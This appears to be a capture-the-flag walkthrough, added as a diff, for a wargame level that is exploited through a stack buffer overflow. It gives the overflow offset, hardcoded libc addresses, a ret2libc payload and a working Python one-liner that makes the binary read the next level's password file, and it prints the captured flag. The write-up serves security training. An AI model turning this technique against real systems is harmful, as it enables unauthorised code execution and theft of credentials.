@@ -1,0 +1,73 @@
+# Level 01 Walkthrough - ret2libc Buffer Overflow
+
+## 1.1 SSH into VM
+sshpass -p `cat level00/flag` ssh -o StrictHostKeyChecking=no level01@localhost -p 4242
+
+## Vulnerability
+
+`fgets(password, 100, stdin)` reads 100 bytes into a buffer whose distance to the
+saved return address on the stack is only **80 bytes**, causing a controllable overflow.
+
+Additionally, both conditional branches in `main()` always lead to the "incorrect
+password" error — there is no reachable success path through normal inputs.
+
+## Stack Layout (main)
+
+```
+esp+0x1c  password buffer   (fgets reads 100 bytes here)
+...
+esp+0x5c  password_result   (overwritten but irrelevant)
+...
+ebp+0x04  saved return addr  <- overwritten at offset 80 from buffer start
+```
+
+Finding the offset with a de Bruijn pattern:
+```
+EIP = 0x61616175  ->  'uaaa'  ->  position 80 in pattern
+```
+
+## Exploit: ret2libc
+
+No ASLR on the target. Addresses from gdb:
+```
+system()  = 0xf7e6aed0
+exit()    = 0xf7e5eb70
+"/bin/sh" = 0xf7f897ec  (in libc)
+```
+
+Payload (sent as the password):
+```
+"A" * 80  +  system  +  exit  +  "/bin/sh"
+```
+
+## Why not system("/bin/sh")?
+
+`system()` forks `/bin/sh`, which inherits fd 0. However, the C stdio library in
+`level01` has already buffered all remaining stdin bytes during the `fgets` calls,
+so the child shell sees EOF and exits immediately without running any commands.
+
+## Solution: embed the command in the username buffer
+
+`a_user_name` (global, `0x804a040`) holds the username. `strncmp` only checks 7
+bytes, so the rest of the 256-byte `fgets` input is stored but ignored.
+
+Write `"dat_wil\x00cat /home/users/level02/.pass"` as the username, then call
+`system(a_user_name + 8)` — no interactive shell needed, no stdin buffering issue.
+
+## One-liner
+
+```bash
+python -c "
+import struct, os
+system   = 0xf7e6aed0
+exit_    = 0xf7e5eb70
+cmd_addr = 0x804a040 + 8   # points to 'cat /home/users/level02/.pass' in username buf
+username = 'dat_wil\x00cat /home/users/level02/.pass\n'
+password = 'A'*80 + struct.pack('<I',system) + struct.pack('<I',exit_) + struct.pack('<I',cmd_addr) + '\n'
+os.write(1, username + password)
+" | ./level01
+```
+
+## Flag
+
+`PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`
